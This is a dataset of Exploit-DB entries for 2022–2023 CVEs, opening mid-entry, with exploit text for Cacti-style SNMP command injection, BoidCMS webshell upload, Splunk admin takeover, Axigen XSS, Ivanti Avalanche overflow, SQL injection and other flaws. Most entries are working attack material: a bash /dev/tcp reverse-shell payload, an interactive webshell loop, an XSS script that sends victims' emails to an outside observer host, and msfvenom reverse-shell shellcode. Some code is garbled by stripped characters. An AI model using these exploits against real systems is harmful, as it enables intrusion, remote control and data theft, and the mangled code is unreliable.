- Combined SCSI Disk I/O"" - (Creating the Device from the template ""Net-SNMP Device"" will satisfy the Graphs prerequisite) - In the ""SNMP Options"", for the ""SNMP Community String"" field, use a value like this: public\' ; touch /tmp/m3ssap0 ; \' - Click the ""Create"" button. - Check under /tmp the presence of the created file. To obtain a reverse shell, a payload like the following can be used. public\' ; bash -c ""exec bash -i &>/dev/tcp/ / <&1"" ; \' A similar exploit can be used editing an existing Device, with the same prerequisites, and waiting for the poller to run. It could be necessary to change the content of the ""Downed Device Detection"" field under the ""Availability/Reachability Options"" section with an item that doesn't involve SNMP (because the malicious payload could break the interaction with the host). Root Cause A detailed root cause of the vulnerability is available in the original security advisory ( <URL> or in my blog post ( <URL> References - <URL> - <URL> - <URL>"
CVE-2023-38836,"{""CVE-2023-38836"": 1}",2023-10-09,BoidCMS v2.0.0 - authenticated file upload vulnerability,https://www.exploit-db.com/exploits/51741,"#!/usr/bin/python3 Exploit Title: BoidCMS v2.0.0 - authenticated file upload vulnerability Date: 08/21/2023 Exploit Author: 1337kid Vendor Homepage: <URL> Software Link: <URL> Version: <= 2.0.0 Tested on: Ubuntu CVE : CVE-2023-38836 import requests import re import argparse parser = argparse.ArgumentParser(description='Exploit for CVE-2023-38836') parser.addargument(""-u"", ""--url"", help=""website url"") parser.addargument(""-l"", ""--user"", help=""admin username"") parser.addargument(""-p"", ""--passwd"", help=""admin password"") args = parser.parseargs() baseurl=args.url user=args.user passwd=args.passwd def showhelp(): print(parser.printhelp()) exit() if baseurl == None: showhelp() elif user == None: showhelp() elif passwd == None: showhelp() with requests.Session() as s: req=s.get(f'{baseurl}/admin') token=re.findall('[a-z0-9]{64}',req.text) formlogindata={ ""username"":user, ""password"":passwd, ""login"":""Login"", formlogindata['token']=token s.post(f'{baseurl}/admin',data=formlogindata) #= File upload to RCE req=s.get(f'{baseurl}/admin?page=media') token=re.findall('[a-z0-9]{64}',req.text) formuplddata={ ""token"":token, ""upload"":""Upload"" #= php shell phpcode=['GIF89a;\n',' '] with open('shell.php','w') as f: f.writelines(phpcode) file = {'file' : open('shell.php','rb')} s.post(f'{baseurl}/admin?page=media',files=file,data=formuplddata) req=s.get(f'{baseurl}/media/shell.php') if req.statuscode == '404': print(""Upload failed"") exit() print(f'Shell uploaded to ""{baseurl}/media/shell.php""') while 1: cmd=input(""cmd >> "") if cmd=='exit': exit() req=s.get(f'{base_url}/media/shell.php',params = {""cmd"": cmd}) print(req.text)"
CVE-2023-32707,"{""CVE-2023-32707"": 1}",2023-10-09,Splunk 9.0.5 - admin account take over,https://www.exploit-db.com/exploits/51747,"#!/usr/bin/env python3 Exploit Title: Splunk 9.0.5 - admin account take over Author: [Redway Security]( <URL> Discovery: [Santiago Lopez]( <URL> CVE: CVE-2023-32707 Vendor Description: A low-privilege user who holds a role that has the `edituser` capability assigned to it can escalate their privileges to that of the admin user by providing specially crafted web requests. Versions Affected: Splunk Enterprise below 9.0.5, 8.2.11, and 8.1.14. import argparse import requests import random import string import base64 ignore warnings import urllib3 urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) Parse command-line arguments parser = argparse.ArgumentParser(description='Splunk Authentication') parser.addargument('--host', required=True, help='Splunk host or IP address') parser.addargument('--username', required=True, help='Splunk username') parser.addargument('--password', required=True, help='Splunk password') parser.addargument('--target-user', required=True, help='Target user') parser.addargument('--force-exploit', action='storetrue', help='Force exploit') args = parser.parseargs() Splunk server settings splunkhost = args.host.split(':')[0] splunkusername = args.username splunkpassword = args.password targetuser = args.targetuser forceexploit = args.forceexploit splunkport = args.host.split(':')[1] if len(args.host.split(':')) > 1 else 8089 userendpoint = f"" <URL> credentials = f""{splunkusername}:{splunkpassword}"" base64credentials = base64.b64encode(credentials.encode()).decode() headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x8664; rv:109.0) Gecko/20100101 Firefox/109.0', 'Authorization': f'Basic {base64credentials}' proxies = { # 'http': '[ <URL> <URL> # 'https': ' <URL> response = requests.get(f""{userendpoint}/{splunkusername}?outputmode=json"", headers=headers, proxies=proxies, verify=False) if response.statuscode == 200: affectedversions = ['9.0.4', '8.2.10', '8.1.13'] user = response.json() splunkversion = user['generator']['version'] This is not a good way to compare versions. There is a range of versions that are affected by this CVE, but this is just a"
CVE-2023-34723,"{""CVE-2023-34723"": 1}",2023-09-08,Techview LA-5570 Wireless Gateway Home Automation Controller - Multiple Vulnerabilities,https://www.exploit-db.com/exploits/51720,Exploit Title: Techview LA-5570 Wireless Gateway Home Automation Controller - Multiple Vulnerabilities Google Dork: N/A Date: 25/08/2023 Exploit Author: The Security Team [exploitsecurity.io ] Vendor Homepage: <URL> Software Link: N/A Version: 1.0.19_T53 Tested on: MACOS/Linux CVE : CVE-2023-34723
CVE-2023-4548,"{""CVE-2023-4548"": 1}",2023-09-08,SPA-Cart eCommerce CMS 1.9.0.3 - SQL Injection,https://www.exploit-db.com/exploits/51714,"Exploit Title: SPA-Cart eCommerce CMS 1.9.0.3 - SQL Injection Exploit Author: CraCkEr Date: 20/08/2023 Vendor: SPA-Cart Vendor Homepage: <URL> Software Link: <URL> Version: 1.9.0.3 Tested on: Windows 10 Pro Impact: Database Access CVE: CVE-2023-4548 CWE: CWE-89 / CWE-74 / CWE-707 #Greetings ThePitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description SQL injection attacks can allow unauthorized access to sensitive data, modification of data and crash the application or make it unavailable, leading to lost revenue and damage to a company's reputation. Path: /search GET parameter 'filter[brandid]' is vulnerable to SQL Injection <URL> Parameter: filter[brandid] (GET) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: filtered=1&q=11&load_filter=1&filter[brandid]=4'XOR(SELECT(0)FROM(SELECT(SLEEP(7)a)XOR'Z&filter[price]=100-500&filter[attr][Memory][]=500 GB&filter[attr][Color][]=Black [-] Done"
CVE-2022-4953,"{""CVE-2022-4953"": 1}",2023-09-08,Wordpress Plugin Elementor 3.5.5 - Iframe Injection,https://www.exploit-db.com/exploits/51716,Exploit Title: Wordpress Plugin Elementor < 3.5.5 - Iframe Injection Date: 28.08.2023 Exploit Author: Miguel Santareno Vendor Homepage: <URL> Version: < 3.5.5 Tested on: Google and Firefox latest version CVE : CVE-2022-4953 1. Description The plugin does not filter out user-controlled URLs from being loaded into the DOM. This could be used to inject rogue iframes that point to malicious URLs. 2. Proof of Concept (
CVE-2022-31470,"{""CVE-2022-31470"": 1}",2023-09-08,"Axigen &lt; 10.3.3.47, 10.2.3.12 - Reflected XSS",https://www.exploit-db.com/exploits/51722,"Exploit Title: Axigen < 10.3.3.47, 10.2.3.12 - Reflected XSS Google Dork: inurl:passwordexpired=yes Date: 2023-08-21 Exploit Author: AmirZargham Vendor Homepage: <URL> Software Link: <URL> Version: (10.5.0–4370c946) and older version of Axigen WebMail Tested on: firefox,chrome CVE: CVE-2022-31470 Exploit We use the second Reflected XSS to exploit this vulnerability, create a malicious link, and steal user emails. Dropper code This dropper code, loads and executes JavaScript exploit code from a remote server. x = document.createElement('script'); x.src = ' <URL> window.addEventListener('DOMContentLoaded',function y(){ document.body.appendChild(x) Encoded form /index.hsp?m=%27)%3Bx%3Ddocument.createElement(%27script%27)%3Bx.src%3D%27 <URL> Exploit code xhr1 = new XMLHttpRequest(), xhr2 = new XMLHttpRequest(), xhr3 = new XMLHttpRequest(); oobserver = ' <URL> var scripttag = document.createElement('script'); xhr1.open('GET', '/', true); xhr1.onreadystatechange = () => { if (xhr1.readyState = XMLHttpRequest.DONE) { hcookie = new URL(xhr1.responseURL).search.split(""="")[1]; xhr2.open('PATCH', /api/v1/conversations/MQ/?_h=${_h_cookie}, true); xhr2.setRequestHeader('Content-Type', 'application/json'); xhr2.onreadystatechange = () => { if (xhr2.readyState = XMLHttpRequest.DONE) { if (xhr2.status = 401){ scripttag.src = `${oobserver}?status=sessionexpired&domain=${document.domain}`; document.body.appendChild(scripttag); } else { resp = xhr2.responseText; folderId = JSON.parse(resp)[""mails""][0][""folderId""]; xhr3.open('GET', /api/v1/conversations?folderId=${folderId}&_h=${_h_cookie}, true); xhr3.onreadystatechange = () => { if (xhr3.readyState = XMLHttpRequest.DONE) { emails = xhr3.responseText; scripttag.src = `${oobserver}?status=ok&domain=${document.domain}&emails=${btoa(emails)}`; document.body.appendChild(script_tag); xhr3.send(); var body = JSON.stringify({isUnread: false}); xhr2.send(body); xhr1.send(); Combining dropper and exploit You can host the exploit code somewhere and then address it in the dropper code."
CVE-2023-32560,"{""CVE-2023-32560"": 1}",2023-09-04,Ivanti Avalanche &lt;v6.4.0.0 - Remote Code Execution,https://www.exploit-db.com/exploits/51699,"Exploit Title: Ivanti Avalanche III{}s{}s'.format(self.namesize, self.valuesize), self.type, self.namesize, self.valuesize, self.name, self.value) Create a header structure class HP: def init(self, hdr, payload): self.hdr = hdr self.payload = payload self.pad = b'\x00' (16 - (len(self.hdr) + len(self.payload)) % 16) def pack(self): return b''.join([item.pack() for item in self.hdr]) + \ b''.join([item.pack() for item in self.payload]) + self.pad Create a preamble structure class Preamble: def __init__(self, hp): self.msg_size = len(hp.pack()) + 16 self.hdr_size = sum([len(item.pack()) for item in hp.hdr]) self.payload_size = sum([len(item.pack()) for item in hp.payload]) self.unk = 0 Unknown value def pack(self): return struct.pack('>IIII', self.msg_size, self.hdr_size, self.payload_size, self.unk) Create a message structure class Msg: def __init__(self, hp): self.pre = Preamble(hp) self.hdrpay = hp def pack(self): return self.pre.pack() + self.hdrpay.pack() msfvenom -p windows/shell_reverse_tcp LHOST=192.168.86.30 LPORT=4444 exitfunc=thread -f python shellcode = b"""" shellcode += b""fce8820000006089e531c064"" shellcode += b""8b50308b520c8b52148b7228"" shellcode += b""0fb74a2631ffac3c617c022c"" shellcode += b""20c1cf0d01c7e2f252578b52"" shellcode += b""108b4a3c8b4c1178e34801d1"" shellcode += b""518b592001d38b4918e33a49"" shellcode += b""8b348b01d631ffacc1cf0d01"" shellcode += b""c738e075f6037df83b7d2475"" shellcode += b""e4588b582401d3668b0c4b8b"" shellcode += b""581c01d38b048b01d0894424"" shellcode += b""245b5b61595a51ffe05f5f5a"" shellcode += b""8b12eb8d5d68333200006877"" shellcode += b""73325f54684c772607ffd5b8"" shellcode += b""9001000029c454506829806b"" shellcode += b""00ffd5505050504050405068"" shellcode += b""ea0fdfe0ffd5976a0568c0a8"" shellcode += b""561e680200115c89e66a1056"" shellcode += b""576899a57461ffd585c0740c"" shellcode += b""ff4e0875ec68f0b5a256ffd5"" shellcode += b""68636d640089e357575731f6"" shellcode += b""6a125956e2fd66c744243c01"" shellcode += b""018d442410c6004454505656"" shellcode += b""5646564e565653566879cc3f"" shellcode += b""86ffd589e04e5646ff306808"" shellcode += b""871d60ffd5bbe01d2a0a68a6"" shellcode += b""95bd9dffd53c067c0a80fbe0"" shellcode += b""7505bb4713726f6a0053ffd5"" buf = b'90' 340 buf += b'812b4100' jmp esp (0x00412b81) buf += b'90909090' buf += b'90909090' buf += shellcode buf += b'41' 80 buf += b'84d45200' stack pivot: add esp, 0x00000FA0 ; retn 0x0004 ; (0x0052d484) buf += b'43' (0x800 - len(buf)) buf2 = b'41' * 0x1000 Create message payload hdr = [Item(3, ""pwned"", buf)] payload = [Item(3, ""pwned"", buf2)] dummy payload, probabaly not necessary hpinstance = HP(hdr, payload) msginstance = Msg(hpinstance) Default port port = 1777 check for target host argument if len(sys.argv) > 1: host = sys.argv[1] else: print(""Usage: python3 CVE-2023-32560.py "") sys.exit() with socket.socket(socket.AFINET, socket.SOCKSTREAM) as s: s.connect((host, port)) s.sendall(msginstance.pack()) print(""Message sent!"") s.close()"
CVE-2023-4382,"{""CVE-2023-4382"": 1}",2023-09-04,Hyip Rio 2.1 - Arbitrary File Upload,https://www.exploit-db.com/exploits/51698,"Exploit Title: Hyip Rio 2.1 - Arbitrary File Upload Exploit Author: CraCkEr Date: 30/07/2023 Vendor: tdevs Vendor Homepage: <URL> Software Link: <URL> Version: 2.1 Tested on: Windows 10 Pro Impact: Allows User to upload files to the web server CVE: CVE-2023-4382 #Description Allows Attacker to upload malicious files onto the server, such as Stored XSS #Steps to Reproduce: 1. Login as a [Normal User] 2. In [User Dashboard], go to [Profile Settings] on this Path: <URL> 3. Upload any Image into the [avatar] 4. Capture the POST Request with [Burp Proxy Intercept] 5. Edit the file extension to .svg & inject your [Evil-Code] or [Stored XSS] POST /user/settings/profile-update HTTP/2 Content-Disposition: form-data; name=""avatar""; filename=""XSS.svg"" Content-Type: image/png - 6. Send the Request 7. Capture the GET request from [Burp Logger] to get the Path of your Uploaded [Stored-XSS] or right-click on the Avatar and Copy the Link 8. Access your Uploded Evil file on this Path: <URL> [-] Done"
CVE-2023-4407,"{""CVE-2023-4407"": 1}",2023-09-04,Credit Lite 1.5.4 - SQL Injection,https://www.exploit-db.com/exploits/51701,"Exploit Title: Credit Lite 1.5.4 - SQL Injection Exploit Author: CraCkEr Date: 31/07/2023 Vendor: Hobby-Tech Vendor Homepage: <URL> Software Link: <URL> Version: 1.5.4 Tested on: Windows 10 Pro Impact: Database Access CVE: CVE-2023-4407 CWE: CWE-89 - CWE-74 - CWE-707 #Description SQL injection attacks can allow unauthorized access to sensitive data, modification of data and crash the application or make it unavailable, leading to lost revenue and damage to a company's reputation. #Steps to Reproduce: To Catch the POST Request 1. Visit [Account Statement] on this Path: <URL> 2. Select [Start Date] + [End Date] + [Account Number] and Click on [Filter] Path: /portal/reports/accountstatement POST parameter 'date1' is vulnerable to SQL Injection POST parameter 'date2' is vulnerable to SQL Injection POST /portal/reports/accountstatement HTTP/2 token=5k2IfXrQ8aueUQzrd5UfilSZzgOC5vyCPGxTTZDK&date1=[SQLi]&date2=[SQLi]&accountnumber=20005001 Parameter: date1 (POST) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: token=5k2IfXrQ8aueUQzrd5UfilSZzgOC5vyCPGxTTZDK&date1=2023-07-31'XOR(SELECT(0)FROM(SELECT(SLEEP(5)a)XOR'Z&date2=2023-07-31&accountnumber=20005001 Parameter: date2 (POST) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: token=5k2IfXrQ8aueUQzrd5UfilSZzgOC5vyCPGxTTZDK&date1=2023-07-31&date2=2023-07-31'XOR(SELECT(0)FROM(SELECT(SLEEP(9)a)XOR'Z&account_number=20005001 [-] Done"
CVE-2022-23513,"{""CVE-2022-23513"": 1}",2023-09-04,AdminLTE PiHole 5.18 - Broken Access Control,https://www.exploit-db.com/exploits/51705,"Exploit Title: AdminLTE PiHole < 5.18 - Broken Access Control Google Dork: [inurl:admin/scripts/pi-hole/phpqueryads.php]( <URL> Date: 21.12.2022 Exploit Author: kv1to Version: Pi-hole v5.14.2; FTL v5.19.2; Web Interface v5.17 Tested on: Raspbian / Debian Vendor: <URL> CVE : CVE-2022-23513 In case of an attack, the threat actor will obtain the ability to perform an unauthorized query for blocked domains on queryads endpoint. #Proof Of Concept with curl: curl ' <URL> ' #HTTP requests GET /admin/scripts/pi-hole/php/queryads.php?domain= ' HTTP/1.1 HOST: pi.hole Cookie: [..SNIPPED..] [..SNIPPED..] #HTTP Response HTTP/1.1 200 OK [..SNIPPED..] data: Match found in [..SNIPPED..] data: data: data:"
CVE-2023-39026,"{""CVE-2023-39026"": 1}",2023-09-04,FileMage Gateway 1.10.9 - Local File Inclusion,https://www.exploit-db.com/exploits/51708,"Exploit Title: FileMage Gateway 1.10.9 - Local File Inclusion Date: 8/22/2023 Exploit Author: Bryce ""Raindayzz"" Harty Vendor Homepage: <URL> Version: Azure Versions < 1.10.9 Tested on: All Azure deployments < 1.10.9 CVE : CVE-2023-39026 Technical Blog - <URL> Patch from vendor - <URL> import requests import warnings warnings.filterwarnings(""ignore"") def worker(url): response = requests.get(url, verify=False, timeout=.5) return response def main(): listIP = [] filepath = input(""Enter the path to the file containing the IP addresses: "") with open(filepath, 'r') as file: iplist = file.read().splitlines() searchString = ""tls"" for ip in iplist: url = f"" <URL> + ""/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml"" try: response = worker(url) print(response.text) if searchString in response.text: print(""Vulnerable IP: "" + ip) print(response.text) listIP.append(ip) except requests.exceptions.RequestException as e: print(f""Error occurred for {ip}: {str(e)}"") for x in listIP: print(x) if name == 'main': main()"
CVE-2022-25148,"{""CVE-2022-25148"": 1}",2023-09-04,WP Statistics Plugin 13.1.5 current_page_id - Time based SQL injection (Unauthenticated),https://www.exploit-db.com/exploits/51711,"Exploit Title: WP Statistics Plugin <= 13.1.5 currentpageid - Time based SQL injection (Unauthenticated) Date: 13/02/2022 Exploit Author: psychoSherlock Vendor Homepage: <URL> Software Link: <URL> Version: 13.1.5 and prior Tested on: wp-statistics 13.1.5 CVE : CVE-2022-25148 Vendor URL: <URL> CVSS Score: 8.4 (High) import argparse import requests import re import urllib.parse def main(): parser = argparse.ArgumentParser(description=""CVE-2022-25148"") parser.addargument('-u', '--url', required=True, help='Wordpress base URL') args = parser.parseargs() baseUrl = args.url payload = ""IF(1=1, sleep(5), 1)"" wpsession = requests.session() resp = wpsession.get(baseUrl) nonce = re.search(r'wpnonce=(.*?)℘statisticshit', resp.text).group(1) print(f""Gathered Nonce: {nonce}"") headers = { ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 1221) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15""} payload = urllib.parse.quoteplus(payload) exploit = f'/wp-json/wp-statistics/v2/hit?=11&wpnonce={nonce}℘statisticshitrest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusionmatch=no&exclusionreason&ua=Something&trackall=1×tamp=11¤tpagetype=home¤tpageid={payload}&searchquery&pageuri=/&userid=0' exploiturl = baseUrl + exploit print(f'\nSending: {exploiturl}') resp = wpsession.get(exploiturl, headers=headers) if float(resp.elapsed.totalseconds()) >= 5.0: print(""\n! Target is vulnerable !"") print(f'\nTime taken: {resp.elapsed.totalseconds()}') else: print('Target is not vulnerable') if name == ""main_"": main()"
CVE-2023-4547,"{""CVE-2023-4547"": 1}",2023-09-04,SPA-Cart eCommerce CMS 1.9.0.3 - Reflected XSS,https://www.exploit-db.com/exploits/51713,"Exploit Title: SPA-Cart eCommerce CMS 1.9.0.3 - Reflected XSS Exploit Author: CraCkEr Date: 20/08/2023 Vendor: SPA-Cart Vendor Homepage: <URL> Software Link: <URL> Version: 1.9.0.3 Tested on: Windows 10 Pro Impact: Manipulate the content of the site CVE: CVE-2023-4547 CWE: CWE-79 - CWE-74 - CWE-707 #Greetings ThePitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob #Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /search GET parameter 'filter[brandid]' is vulnerable to XSS GET parameter 'filter[price]' is vulnerable to XSS <URL> XSS Payloads: vnxjb""> bvu51 [-] Done"
CVE-2023-31468,"{""CVE-2023-31468"": 1}",2023-08-21,Inosoft VisiWin 7 2022-2.1 - Insecure Folders Permissions,https://www.exploit-db.com/exploits/51682,"Exploit Title: Inosoft VisiWin 7 2022-2.1 - Insecure Folders Permissions Privilege Escalation Date: 2023-08-09 Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia Vendor Homepage: <URL> Version: Up to 2022-2.1 (Runtime RT7.3 RC3 20221209.5) Tested on: Windows CVE: CVE-2023-31468 Inosoft VisiWin is a completely open system with a configurable range of functions. It combines all features of classic HMI software with unlimited programming possibilities. The installation of the solution will create insecure folder, and this could allow a malicious user to manipulate file content or change legitimate files (e.g., VisiWin7.Server.Manager.exe which runs with SYSTEM privileges) to compromise a system or to gain elevated privileges. This is the list of insecure files and folders with their respective permissions: C:\>icacls ""C:\Program Files (x86)\INOSOFT GmbH"" C:\Program Files (x86)\INOSOFT GmbH BUILTIN\Administrators:(OI)(CI)(F) Everyone:(OI)(CI)(F) NT AUTHORITY\SYSTEM:(OI)(CI)(F) Successfully processed 1 files; Failed processing 0 files C:\> C:\>icacls ""C:\Program Files (x86)\INOSOFT GmbH\VisiWin7\Runtime\VisiWin7.Server.Manager.exe"" C:\Program Files (x86)\INOSOFT GmbH\VisiWin 7\Runtime\VisiWin7.Server.Manager.exe BUILTIN\Administrators:(I)(F) Everyone:(I)(F) NT AUTHORITY\SYSTEM:(I)(F) Successfully processed 1 files; Failed processing 0 files C:\>"
CVE-2023-31067,"{""CVE-2023-31067"": 1}",2023-08-21,TSplus 16.0.2.14 - Remote Access Insecure Files and Folders Permissions,https://www.exploit-db.com/exploits/51679,"Exploit Title: TSplus 16.0.2.14 - Remote Access Insecure Files and Folders Permissions Date: 2023-08-09 Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia Vendor Homepage: <URL> Version: Up to 16.0.2.14 Tested on: Windows CVE : CVE-2023-31067 TSplus Remote Access (v. 16.0.2.14) is an alternative to Citrix and Microsoft RDS for remote desktop access and Windows application delivery. Web-enable your legacy apps, create SaaS solutions or remotely access your centralized corporate tools and files. The TSplus Remote Access solution comes with an embedded web server to allow remote users to easely connect remotely. However, insecure file and folder permissions are set and this could allow a malicious user to manipulate file content (e.g.: changing the code of html pages or js scripts) or change legitimate files (e.g. Setup-VirtualPrinter-Client.exe) in order to compromise a system or to gain elevated privileges. This is the list of insecure files and folders with their respective permissions: Everyone:(OI)(CF)(F) and Everyone(F) Permission: Everyone:(OI)(CI)(F) C:\Program Files (x86)\TSplus\Clients\www C:\Program Files (x86)\TSplus\Clients\www\addons C:\Program Files (x86)\TSplus\Clients\www\ConnectionClient C:\Program Files (x86)\TSplus\Clients\www\downloads C:\Program Files (x86)\TSplus\Clients\www\prints C:\Program Files (x86)\TSplus\Clients\www\RemoteAppClient C:\Program Files (x86)\TSplus\Clients\www\software C:\Program Files (x86)\TSplus\Clients\www\var C:\Program Files (x86)\TSplus\Clients\www\cgi-bin\remoteapp C:\Program Files (x86)\TSplus\Clients\www\downloads\shared C:\Program Files (x86)\TSplus\Clients\www\software\java C:\Program Files (x86)\TSplus\Clients\www\software\js C:\Program Files (x86)\TSplus\Clients\www\software\html5\jwres C:\Program Files (x86)\TSplus\Clients\www\software\html5\locales C:\Program Files (x86)\TSplus\Clients\www\software\html5\imgs\topmenu C:\Program Files (x86)\TSplus\Clients\www\software\html5\imgs\key\parts C:\Program Files (x86)\TSplus\Clients\www\software\java\img C:\Program Files (x86)\TSplus\Clients\www\software\java\third C:\Program Files (x86)\TSplus\Clients\www\software\java\img\cp C:\Program Files (x86)\TSplus\Clients\www\software\java\img\srv C:\Program Files (x86)\TSplus\Clients\www\software\java\third\images C:\Program Files (x86)\TSplus\Clients\www\software\java\third\js C:\Program Files (x86)\TSplus\Clients\www\software\java\third\images\bramus C:\Program Files (x86)\TSplus\Clients\www\software\java\third\js\prototype C:\Program Files (x86)\TSplus\Clients\www\var\log C:\Program Files (x86)\TSplus\UserDesktop\themes C:\Program Files (x86)\TSplus\UserDesktop\themes\BlueBar C:\Program Files (x86)\TSplus\UserDesktop\themes\Default C:\Program Files (x86)\TSplus\UserDesktop\themes\GreyBar C:\Program Files (x86)\TSplus\UserDesktop\themes\Logon C:\Program Files (x86)\TSplus\UserDesktop\themes\MenuOnTop C:\Program Files (x86)\TSplus\UserDesktop\themes\Seamless C:\Program Files (x86)\TSplus\UserDesktop\themes\ThinClient C:\Program Files (x86)\TSplus\UserDesktop\themes\Vista Permission: Everyone:(F) C:\Program Files (x86)\TSplus\Clients\www\all.min.css C:\Program Files (x86)\TSplus\Clients\www\custom.css C:\Program Files (x86)\TSplus\Clients\www\popins.css C:\Program Files (x86)\TSplus\Clients\www\robots.txt C:\Program Files (x86)\TSplus\Clients\www\addons\Setup-VirtualPrinter-Client.exe C:\Program Files (x86)\TSplus\Clients\www\cgi-bin\hb.exe.config C:\Program Files (x86)\TSplus\Clients\www\cgi-bin\SessionPrelaunch.Common.dll.config C:\Program Files (x86)\TSplus\Clients\www\cgi-bin\remoteapp\index.html C:\Program Files (x86)\TSplus\Clients\www\RemoteAppClient\index.html C:\Program Files (x86)\TSplus\Clients\www\software\common.css C:\Program Files (x86)\TSplus\Clients\www\software\html5\jwres\jwwebsockify.jar C:\Program Files (x86)\TSplus\Clients\www\software\html5\jwres\web.jar C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\exitlist.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\exitupload.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\getlist.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\getupload.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\postupload.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\uploaderr.html C:\Program Files (x86)\TSplus\Clients\www\software\java\index.html C:\Program Files (x86)\TSplus\Clients\www\software\java\img\index.html C:\Program Files (x86)\TSplus\Clients\www\software\java\img\port.bin C:\Program Files (x86)\TSplus\Clients\www\software\java\third\jws.js C:\Program Files (x86)\TSplus\Clients\www\software\java\third\sha256.js C:\Program Files (x86)\TSplus\Clients\www\software\java\third\js\prototype\prototype.js C:\Program Files (x86)\TSplus\Clients\www\software\js\jquery.min.js"
CVE-2023-31068,"{""CVE-2023-31068"": 1}",2023-08-21,TSplus 16.0.0.0 - Remote Work Insecure Files and Folders,https://www.exploit-db.com/exploits/51680,"Exploit Title: TSplus 16.0.0.0 - Remote Work Insecure Files and Folders Permissions Date: 2023-08-09 Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia Vendor Homepage: <URL> Version: Up to 16.0.0.0 Tested on: Windows CVE : CVE-2023-31068 With TSPlus Remote Work (v. 16.0.0.0) you can create a secure single sign-on web portal and remote desktop gateway that enables users to remotely access the console session of their office PC. The solution comes with an embedded web server to allow remote users to easely connect remotely. However, insecure file and folder permissions are set, and this could allow a malicious user to manipulate file content (e.g.: changing the code of html pages or js scripts) or change legitimate files (e.g. Setup-RemoteWork-Client.exe) in order to compromise a system or to gain elevated privileges. This is the list of insecure files and folders with their respective permissions: Permission: Everyone:(OI)(CI)(F) C:\Program Files (x86)\TSplus-RemoteWork\Clients\www C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\download C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\downloads C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\prints C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\var C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin\remoteapp C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\downloads\shared C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5 C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\jwres C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\locales C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\own C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs\des C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs\key C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs\topmenu C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs\key\parts C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img\cp C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img\srv C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\images C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\images\bramus C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\js\prototype C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\var\log Permission: Everyone:(F) C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\robots.txt C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin\hb.exe.config C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin\SessionPrelaunch.Common.dll.config C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin\remoteapp\index.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\download\common.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\download\lang.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\download\Setup-RemoteWork-Client.exe C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\jwres\jwwebsockify.jar C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\jwres\web.jar C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\own\exitlist.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\own\exitupload.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\index.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img\index.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img\port.bin C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\jws.js C:\Program Files 